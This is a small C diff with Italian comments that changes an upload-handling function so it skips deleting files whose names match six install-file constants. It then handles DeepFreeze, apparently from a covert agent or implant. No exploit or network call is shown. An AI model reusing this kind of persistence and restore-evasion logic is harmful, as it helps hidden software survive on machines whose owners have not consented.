@@ -1430,7 +1430,10 @@ BOOL LOG_HandleUpload(BOOL is_upload)
 			HM_CompletePath(c_file_name, d_file_path);
 		}
 
-		DeleteFile(HM_CompletePath(c_file_name, s_file_path));
+		// Se non e' uno degli altri file noti lo cancella...
+		if (strcmp(c_file_name, BB_INSTALL_NAME1) && strcmp(c_file_name, BB_INSTALL_NAME2) && strcmp(c_file_name, BB_INSTALL_NAME3) &&
+			strcmp(c_file_name, BB_INSTALL_NAME4) && strcmp(c_file_name, BB_INSTALL_NAME5) && strcmp(c_file_name, BB_INSTALL_NAME6))
+			DeleteFile(HM_CompletePath(c_file_name, s_file_path));
 
 		// Se c'e' DeepFreeze fixa i file 
 		if (IsDeepFreeze()) {
